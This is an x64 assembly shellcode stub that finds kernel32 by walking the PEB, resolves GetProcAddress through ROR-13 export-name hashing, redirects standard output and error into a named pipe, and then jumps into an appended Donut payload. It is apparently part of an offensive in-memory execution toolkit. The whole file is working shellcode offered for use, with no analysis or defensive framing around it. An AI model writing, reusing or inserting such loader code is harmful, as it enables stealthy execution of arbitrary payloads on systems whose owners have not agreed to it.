; x64 Stub for Pipe Output Redirection
; Uses GetProcAddress to handle forwarded exports (e.g. CreateFileA -> KernelBase)

[BITS 64]

global _start

section .text

_start:
    ; Save registers
    push rbx
    push rbp
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15

    ; -------------------------------------------------------------------------
    ; 1. Find Kernel32 Base
    ; -------------------------------------------------------------------------
    mov rax, [gs:0x60]          ; PEB
    mov rax, [rax + 0x18]       ; PEB_LDR_DATA
    mov rax, [rax + 0x20]       ; InMemoryOrderModuleList (Head) -> Exe
    mov rax, [rax]              ; -> Ntdll
    mov rax, [rax]              ; -> Kernel32
    mov rbx, [rax + 0x20]       ; DllBase
    
    mov rbp, rbx                ; rbp = HMODULE (Kernel32)

    ; -------------------------------------------------------------------------
    ; 2. Resolve GetProcAddress
    ; -------------------------------------------------------------------------
    ; Hash: 0x7C0DFCAA
    mov r10d, 0x7C0DFCAA
    call get_proc_addr_by_hash
    test rax, rax
    jz fail_open                ; If GetProcAddress failed, abort
    mov r14, rax                ; r14 = GetProcAddress

    ; -------------------------------------------------------------------------
    ; 3. Resolve APIs via GetProcAddress
    ; -------------------------------------------------------------------------
    
    ; Reserve stack for calls & strings
    mov r15, rsp                ; Save stack
    and rsp, 0xFFFFFFFFFFFFFFF0
    sub rsp, 0x100              ; Space for strings + args
    
    ; 2. Resolve CreateFileA
    mov rax, 0x6946657461657243 ; "CreateFi"
    mov [rsp + 0x40], rax
    mov eax, 0x0041656c         ; "leA\0"
    mov [rsp + 0x48], eax
    lea rdx, [rsp + 0x40]       
    
    mov rcx, rbp                ; Kernel32 Base
    call r14                    ; GetProcAddress
    test rax, rax
    jz fail_restore
    mov r12, rax                
    
    ; 3. Resolve SetStdHandle
    mov rax, 0x6148647453746553 ; "SetStdHa"
    mov [rsp + 0x40], rax
    mov rax, 0x00656c646e       ; "ndle\0"
    mov [rsp + 0x48], rax
    lea rdx, [rsp + 0x40]       
    
    mov rcx, rbp                
    call r14                    
    test rax, rax
    jz fail_restore
    mov r13, rax

    ; -------------------------------------------------------------------------
    ; 4. Use APIs
    ; -------------------------------------------------------------------------
    
    ; CreateFileA(pipe_name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)
    
    lea rcx, [rel pipe_name]
    mov edx, 0x40000000         ; GENERIC_WRITE
    xor r8, r8                  ; 0
    xor r9, r9                  ; NULL
    mov qword [rsp + 0x20], 3   ; OPEN_EXISTING
    mov qword [rsp + 0x28], 0   ; Flags
    mov qword [rsp + 0x30], 0   ; Template
    
    call r12
    
    cmp rax, -1
    je fail_restore
    mov rbx, rax                ; rbx = hFile

    ; SetStdHandle(STD_OUTPUT, hFile)
    mov rcx, -11
    mov rdx, rbx
    call r13
    
    ; SetStdHandle(STD_ERROR, hFile)
    mov rcx, -12
    mov rdx, rbx
    call r13

fail_restore:
    mov rsp, r15                ; Restore stack

fail_open:
    ; Restore regs
    pop r15
    pop r14
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbp
    pop rbx
    
    jmp donut_payload

; -------------------------------------------------------------------------
; Data
; -------------------------------------------------------------------------
str_CreateFileA:
    db "CreateFileA", 0
str_SetStdHandle:
    db "SetStdHandle", 0

pipe_name:
    db "\\.\pipe\dnt_00000000", 0
    times 64 db 0

; -------------------------------------------------------------------------
; Helper: get_proc_addr_by_hash
; Input: RBP = Base, R10d = Hash
; Output: RAX = Address
; -------------------------------------------------------------------------
get_proc_addr_by_hash:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push r8
    push r9
    
    mov eax, [rbp + 0x3C]       ; PE Sig
    add rax, rbp
    mov eax, [rax + 0x88]       ; Export Dir
    add rax, rbp
    
    mov r8d, [rax + 0x20]       ; AddressOfNames
    add r8, rbp
    
    mov r9d, [rax + 0x24]       ; AddressOfNameOrdinals
    add r9, rbp
    
    mov ecx, [rax + 0x18]       ; Count
    xor rdx, rdx
    
search_loop:
    cmp rdx, rcx
    je not_found
    
    mov esi, [r8 + rdx * 4]
    add rsi, rbp
    
    xor eax, eax
    xor edi, edi
hash_loop:
    lodsb
    test al, al
    jz hash_done
    ror edi, 13
    add edi, eax
    jmp hash_loop
hash_done:
    cmp edi, r10d
    je found
    
    inc rdx
    jmp search_loop
    
found:
    movzx rdx, word [r9 + rdx * 2]
    mov eax, [rbp + 0x3C]
    add rax, rbp
    mov eax, [rax + 0x88]
    add rax, rbp
    mov r8d, [rax + 0x1C]       ; AddressOfFunctions
    add r8, rbp
    mov eax, [r8 + rdx * 4]
    add rax, rbp
    jmp finish

not_found:
    xor rax, rax

finish:
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

donut_payload:

